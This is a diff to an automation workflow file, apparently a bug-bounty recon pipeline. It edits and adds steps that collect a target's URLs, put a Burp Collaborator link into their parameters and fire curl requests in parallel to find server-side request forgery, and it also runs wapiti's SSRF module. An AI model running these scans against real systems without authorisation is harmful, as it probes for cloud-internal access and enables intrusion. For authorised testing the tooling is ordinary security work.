@@ -6,12 +6,15 @@ env:
   - LOG_DIR: ${HOME}/logs
   - PATH: /usr/local/bin:${PATH}
 steps:
-  - name: AutoSSRF
+  - name: AutoSSRF-External
     command: bash
     script: |
-      gau ${target//\"} | gf ssrf | sort -u |anew | httpx | qsreplace $burpcollaborator_link | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
-  
+      gau ${target//\"} | gf ssrf | sort -u |anew | ~/go/bin/httpx | qsreplace $burpcollaborator_link | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
+  - name: AutoSSRF-Internal
+    command: bash
+    script: |
+      ~/go/bin/httpx -u ${target//\"} | katana qurl  | gf ssrf | sort -u |anew | ~/go/bin/httpx | qsreplace $burpcollaborator_link | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
   - name: CustomSSRF
     command: bash
     script: |
-      wapiti -m ssrf -u $target
+      wapiti -m ssrf -u http://${target//\"}
